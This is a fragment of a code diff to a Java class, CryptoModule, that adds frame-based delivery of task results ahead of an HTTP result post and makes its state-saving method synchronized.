+			// The frame carries these exact bytes; the panel must not re-serialize.
+			if (frameSink.deliver(task.replyTo(), task.name(), json)) {
+				breakerLog("closed");
+				return;
+			}
+		}
 		if (!transport.apiOpen()) {
 			try {
 				CryptoTransport.Reply reply = transport.result(task.id(), json);
 				if (reply.status() >= 200 && reply.status() < 300) {
 					breakerLog("closed");
+					if (byFrame && HTTP_ONLY.contains(task.name())) {
+						frameSink.deliver(task.replyTo(), task.name(), HTTP_MARKER);
+					}
 					return;
 				}
 				log("result post rejected: " + reply.status());
@@ -1299,7 +1562,7 @@ public final class CryptoModule {
 		}
 	}
 
-	private void saveState() {
+	private synchronized void saveState() {
 		try {
 			state.put("passwords", new LinkedHashMap<>(passwords));
 			state.put("uploads", new LinkedHashMap<>(uploads));
